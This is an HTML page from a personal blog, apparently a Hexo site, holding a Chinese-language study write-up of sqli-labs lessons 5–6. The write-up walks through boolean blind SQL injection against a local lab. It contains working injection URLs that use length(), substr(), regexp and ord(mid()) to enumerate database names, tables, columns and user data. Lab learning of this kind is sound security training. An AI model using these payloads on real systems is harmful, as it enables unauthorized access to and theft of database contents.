@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>sqlilab-page1-less5,6学习总结 | Xiaoe&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="目录一、less5-6 的学习二、学习总结 一、less 5-6 的学习less5的学习由上图可以看出只会返回you are in….,不会返回数据库信息，所以这里要使用盲注。首先找注入点，在?id&#x3D;1后面加入单引号’，然后会出现如下报错。语法错误为’1’’ LIMIT 0,1，所以可以使用?id&#x3D;1’–+来进行注入。得到下面的结果，说明存在注入点。接下来我们使用bool盲注。首先我们使用len">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlilab-page1-less5,6学习总结">
+<meta property="og:url" content="http://example.com/2020/11/29/sqlilab-page1-less5-6%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Xiaoe&#39;s Blog">
+<meta property="og:description" content="目录一、less5-6 的学习二、学习总结 一、less 5-6 的学习less5的学习由上图可以看出只会返回you are in….,不会返回数据库信息，所以这里要使用盲注。首先找注入点，在?id&#x3D;1后面加入单引号’，然后会出现如下报错。语法错误为’1’’ LIMIT 0,1，所以可以使用?id&#x3D;1’–+来进行注入。得到下面的结果，说明存在注入点。接下来我们使用bool盲注。首先我们使用len">
+<meta property="og:locale">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/29/Dgemiq.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/29/DgegYt.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/29/DgmGjS.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/29/DgnUKO.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/29/DgnyGt.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/29/DgKX59.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/29/DgQo0U.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/29/Dg1oi4.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/29/Dg3f1A.png">
+<meta property="article:published_time" content="2020-11-29T12:24:00.000Z">
+<meta property="article:modified_time" content="2020-11-29T14:09:40.815Z">
+<meta property="article:author" content="Xiaoe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.ax1x.com/2020/11/29/Dgemiq.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Xiaoe&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Xiaoe&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sqlilab-page1-less5-6学习总结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/29/sqlilab-page1-less5-6%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2020-11-29T12:24:00.000Z" itemprop="datePublished">2020-11-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqlilab-page1-less5,6学习总结
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><h3 id="一、less5-6-的学习"><a href="#一、less5-6-的学习" class="headerlink" title="一、less5-6 的学习"></a>一、less5-6 的学习</h3><h3 id="二、学习总结"><a href="#二、学习总结" class="headerlink" title="二、学习总结"></a>二、学习总结</h3><hr>
+<p><br><br/><br><strong>一、less 5-6 的学习</strong><br>less5的学习<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/Dgemiq"><img src="https://s3.ax1x.com/2020/11/29/Dgemiq.png" alt="Dgemiq.png"></a><br>由上图可以看出只会返回you are in….,不会返回数据库信息，所以这里要使用盲注。<br>首先找注入点，在?id=1后面加入单引号’，然后会出现如下报错。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/DgegYt"><img src="https://s3.ax1x.com/2020/11/29/DgegYt.png" alt="DgegYt.png"></a><br>语法错误为’1’’ LIMIT 0,1，所以可以使用?id=1’–+来进行注入。得到下面的结果，说明存在注入点。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/DgmGjS"><img src="https://s3.ax1x.com/2020/11/29/DgmGjS.png" alt="DgmGjS.png"></a><br>接下来我们使用bool盲注。首先我们使用length（）和database（）猜出目前的数据库的长度。当才对了就会返回you are in…。<br><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and length(database())=8–+<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/DgnUKO"><img src="https://s3.ax1x.com/2020/11/29/DgnUKO.png" alt="DgnUKO.png"></a><br>然后猜数据库的名字，使用<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and left(database(),1)=’s’–+得到下图<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/DgnyGt"><img src="https://s3.ax1x.com/2020/11/29/DgnyGt.png" alt="DgnyGt.png"></a><br>然后一个一个字母地试，得到数据库名。<br>然后猜表名，使用<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))&gt;80–+<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/DgKX59"><img src="https://s3.ax1x.com/2020/11/29/DgKX59.png" alt="DgKX59.png"></a><br>通过二分法，逐步试出表名，再试出所有表名。<br>接下来使用regexp猜出users表中的列，使用<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and 1=(select 1 from information_schema.columns where table_name =’users’ and column_name regexp ‘^username’ limit 0,1)–+得到如图结果<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/DgQo0U"><img src="https://s3.ax1x.com/2020/11/29/DgQo0U.png" alt="DgQo0U.png"></a><br>说明users表中有username这个列。同样地，可以试出users中的所有列。<br>然后就可以试出我们要的数据了，使用ord（）和mid()函数。<br>使用<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68–+得到如下的结果<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/Dg1oi4"><img src="https://s3.ax1x.com/2020/11/29/Dg1oi4.png" alt="Dg1oi4.png"></a><br>68为D的ascii值，也就是第一个username Dumb的第一个字母。通过这样得到我们要的数据。<br></br></p>
+<hr>
+<p>less 6<br>less6中id参数传入与less5不同，使用?id=1”，得到下图<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/Dg3f1A"><img src="https://s3.ax1x.com/2020/11/29/Dg3f1A.png" alt="Dg3f1A.png"></a><br>提示的语法错误是”1”” LIMIT 0,1，可以使用?id=1”–+注释掉后面的，就注入成功了<br>剩下的步骤与less5相同。<br></br><br><strong>学习总结</strong></p>
+<ul>
+<li>bool盲注<br>布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，使web页面返回true或者false，从而达到注入的目的来获取信息</li>
+<li>left()函数<br>left函数的用法为left(string,n) string是要截取的字符串，n为截取的长度</li>
+<li>substr()函数<br>substr函数的用法substr(string,start,length)string是要截取的字符串，start为字符串中要开始截取的位置，length要为截取的长度</li>
+<li>mid()函数<br>mid()函数是用来截取字段的，其用法为 mid(column_name,start[,length])，column_name为字段，start为开始截取的位置，length为要截取的长度（可以不用）。</li>
+<li>ascii()函数和ord()函数<br>两个函数都可以将某个字符转换为ascii码</li>
+<li>regexp<br>regexp后面接的字符串为要匹配的正则表达式</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/29/sqlilab-page1-less5-6%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" data-id="cki37ao980001s0ugau42b6rc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/11/22/Sqlilabs-Page1-less1-4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Sqlilabs Page1 less1-4学习总结</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/29/sqlilab-page1-less5-6%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">sqlilab-page1-less5,6学习总结</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/22/Sqlilabs-Page1-less1-4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">Sqlilabs Page1 less1-4学习总结</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/07/markdown%E8%AF%AD%E6%B3%95/">test</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 Xiaoe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
